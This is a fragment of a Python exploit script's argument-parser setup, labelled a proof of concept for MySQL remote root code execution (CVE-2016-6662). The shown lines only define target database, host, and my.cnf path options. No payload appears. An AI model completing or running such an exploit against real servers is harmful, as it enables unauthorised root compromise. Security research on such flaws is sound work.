...
parser = argparse.ArgumentParser(
    prog="0ldSQL_MySQL_RCE_exploit.py",
    description="PoC for MySQL Remote Root Code Execution / Privesc CVE-2016-6662",
)
...
parser.add_argument(
    "-dbname", dest="TARGET_DB", required=True, help="Remote MySQL database name"
)
parser.add_argument(
    "-dbhost", dest="TARGET_HOST", required=True, help="Remote MySQL host"
)
parser.add_argument(
    "-mycnf",
    dest="TARGET_MYCNF",
    required=True,
    help="Remote my.cnf owned by mysql user",
)
